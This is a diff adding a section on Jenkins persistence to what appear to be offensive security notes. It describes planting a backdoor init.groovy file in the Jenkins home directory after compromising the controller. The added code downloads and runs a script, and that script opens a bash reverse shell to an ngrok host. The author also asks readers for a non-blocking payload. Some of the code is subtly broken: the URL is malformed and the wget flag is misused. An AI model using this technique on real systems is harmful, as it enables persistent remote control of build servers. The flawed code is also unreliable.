@@ -44,6 +44,20 @@ pipeline{
 
 ## Groovy init scripts
 
+- We can try this technique both from pipeline / after controller's compromise.
+- We need to add ```init.groovy``` file with our payload at home directory ( the directory that contains other config files pf Jenkins, sometimes referred as $JENKINS_HOME )
+- To trigger this, we would need a restart.
+- We have couple of options what we can do with our backdoor scripts
+  - Get a reverse shell - From my personal research I found my payloads / the ones from internet blocked the Jenkins from rebooting. This is because Jenkins is waiting for the init.groovy to complete before it can proceed. If you have a non blocking playload do let me know.
+init.groovy
+```
+"wget -o revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
+"sh revshell.sh".execute()
+```
+revshell.sh
+```
+bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
+```
 ## Worker-Node SSH Keys
 
 - We can dump the SSH keys from the Jenkins Controller
